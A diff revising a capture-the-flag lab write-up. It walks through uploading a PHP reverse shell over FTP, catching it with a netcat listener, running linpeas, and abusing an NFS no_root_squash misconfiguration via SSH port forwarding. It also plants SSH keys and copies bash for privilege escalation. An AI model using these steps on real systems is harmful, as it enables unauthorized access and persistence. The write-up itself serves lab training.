@@ -2,7 +2,7 @@
 
 # Scanning 
 
-I started with an aggressive nmap scan to enumerate services. 
+I started with an aggressive nmap scan to enumerate services. I like to use the command ```nmap -A [Remote IP]```.
 ```
 PORT   STATE SERVICE VERSION
 21/tcp open  ftp     vsftpd 3.0.3
@@ -116,7 +116,7 @@ drwxr-xr-x    2 48       48             24 Nov 08  2020 backups
 
 # Initial Access
 
-I created a reverse shell using pentest monkey's php reverse shell (```https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php```) with my IP and port 9999. Then, I placed the reverse shell in the directory that I landed in with FTP. 
+With the knowledge of the ability to upload files via FTP, I created a reverse shell using pentest monkey's php reverse shell (```https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php```) setting the correct IP and changing the port to 9999. Then, I placed the reverse shell in the directory that I landed in with FTP. 
 ```
 ftp> put php-reverse-shell.php 
 local: php-reverse-shell.php remote: php-reverse-shell.php
@@ -125,16 +125,15 @@ local: php-reverse-shell.php remote: php-reverse-shell.php
 226 Transfer complete.
 5492 bytes sent in 0.00 secs (62.3521 MB/s)
 ```
-I opened up a netcat listener on port 9999 and caught the shell. 
-
+I opened up a netcat listener on port 9999.  
 ```
 nc -lnvp 9999
 ```
-Then, I ran a curl command to call the php shell. 
+Then, I ran a curl command to call the php reverse shell which I caught with the netcat listener above. 
 ```
 curl http://[Remote IP]/php-reverse-shell.php
 ```
-Now, I have a shell! 
+Now, I have a shell as user apache!
 ```
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 uid=48(apache) gid=48(apache) groups=48(apache)
@@ -148,19 +147,19 @@ sh-4.4$ python3 -c 'import pty; pty.spawn("/bin/bash")'
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 bash-4.4$
 ```
-Now that I am logged in as a user, I can find the web flag. 
+Now that I am logged in as user apache, I can find the web flag. 
 ```
 bash-4.4$ ls
 ls
 error  icons  noindex  web.flag
 ```
-I uploaded LinPeas.sh (```https://github.com/carlospolop/PEASS-ng/releases/tag/20220214```) to do further enumeration on the remote machine. I uploaded using FTP like I did with the PHP reverse shell. However, with the shell that I have on the machine, I had to navigate to ```/var/www/html``` to get the ```linpeas.sh``` that I uploaded with FTP. Also, I needed to login as paradox since before I was only apache. 
+I uploaded LinPeas.sh (```https://github.com/carlospolop/PEASS-ng/releases/tag/20220214```) to do further enumeration on the remote machine and to get ideas for privilege escalation. I uploaded linpeas using FTP like I did with the PHP reverse shell. In order to execute linpeas, I had to navigate to ```/var/www/html``` and I needed to login as paradox user (since before I was only apache user when I dropped into the reverse shell).
 ```
 bash-4.4$ su paradox
 su paradox
 Password: [REDACTED]
 ```
-Now that I am user paradox, I can set the correct permissions for linpeas to execute and execute within the terminal. Linpeas produces a lot of output. However, it looks like NFS is vulnerable. To check out the rpc options, I run ```rpcinfo -p``` to find the below. 
+Now that I am user paradox, I can set the correct permissions for linpeas to execute within the terminal. Linpeas produces a lot of output. However, it looks like NFS is vulnerable. To check out the rpc options, I run ```rpcinfo -p``` to find the below. 
 ```
 rpcinfo -p
    program vers proto   port  service
@@ -188,23 +187,25 @@ rpcinfo -p
     100021    3   tcp  40111  nlockmgr
     100021    4   tcp  40111  nlockmgr
 ```
-My best option is to try to connect to one of the nfs at port 2049. I want to try to ssh to the port, so I will create a paradox ssh user on my local machine and copy the key over so that it is authorized to login. 
+It looks like NFS is vulnerable to privilege escalation through a misconfiguration (https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe). My best option is to try to connect to one of the nfs at port 2049. But, I am not able to do so remotely. I need to forward an NFS connection over to my remote/attacker machine via ssh. It is eaiser since I already have a user (paradox) on the victim machine. 
+
+First, I will create a similar paradox user on my local/attack machine and copy the key over so that it is authorized to login via ssh. 
 ```
 ssh-keygen -f paradox
 ```
-I also need to add the paradox ssh key to the authorized hosts on the remote machine. 
+I also need to add the paradox ssh key to the authorized hosts on the remote/victim machine. 
 ```
 echo "ssh-rsa [KEY]" > .ssh/authorized_keys
 ```
-With the paradox public key in authorized keys and the private key for paradox, I am able to ssh into the machine using port forwarding on port 2049 on the remote machine and my local machine. Once connected, it will give me a shell with ssh. 
+With the paradox public key in authorized keys and the private key for paradox, I am able to ssh into the machine using port forwarding on port 2049 on both my attack machine and the victim machine. I needed to use port 2049 because I want to set up an NFS on my localhost at the appropriate port. Therefore, I want to forward any connection on port 2049 to port 2049 on my local machine over ssh. Once connected, it will give me a shell with ssh. 
 ```
 ssh paradox@[Remote IP] -i paradox -L 2049:localhost:2049
 ```
-Now, I created a mnt directory within the attack machines local directory so that I can mount the NFS from the victim. I used the mount command to connect the two.  
+Now, I created a mnt directory in my attack machine so that I can mount the NFS from the victim. I used the mount command to connect the two.  
 ```
 sudo mount -v -t nfs localhost:/ ./mnt/
 ```
-Finally, I went to the mnt directory in my local machine and found the user flag. The mnt directory on my attack machine is really the home directory of paradox now. 
+Finally, I went to the mnt directory in my local machine and found the user flag. The mnt directory on my attack machine is really the home directory of paradox user now. 
 ```
 ajread@aj-ubuntu:~/TryHackMe/practice/mnt$ ls
 user.flag
@@ -212,13 +213,13 @@ user.flag
 
 # Privilege Escalation 
 
-I know that james is another user on the machine. So, I did the same steps with james as a did with paradox, setting up a ssh key on my attack box with ```ssh-keygen -f james```, adding it to authorized keys and authenticating with the private key. However, this time I used my mounted NFS to upload the ssh key. Therefore, authorized keys was located at ```/mnt/.ssh/authorized_keys``` on my local machine, which is really the home directory of the remote user. 
+I know that james is another user on the machine. So, I did the same steps with james as a did with paradox, setting up a ssh key on my attack box with ```ssh-keygen -f james```, adding it to authorized keys and authenticating with the private key. However, this time I used my mounted NFS to upload the james private key and update to authorized keys. Therefore, authorized keys was located at ```/mnt/.ssh/authorized_keys``` on my local machine and the same goes for the private keys found at ```/mnt/.ssh/id_rsa```. 
 
-After those steps were complete, I was able to ssh into the box. 
+After those steps were complete, I was able to ssh into the box from my attack machine. 
 ```
 ssh -i james james@10.10.252.23
 ```
-I copied ```/bin/bash``` on the target machine to the current working directory on the target machine so that I can access it via NFS.
+With my mounted connection to the victim, I copied the version ```/bin/bash``` on the victim/target machine to the current working directory on the victim/target machine. This gives me the ability to edit the permissions of bash. 
 ```
 cp /bin/bash .
 ```
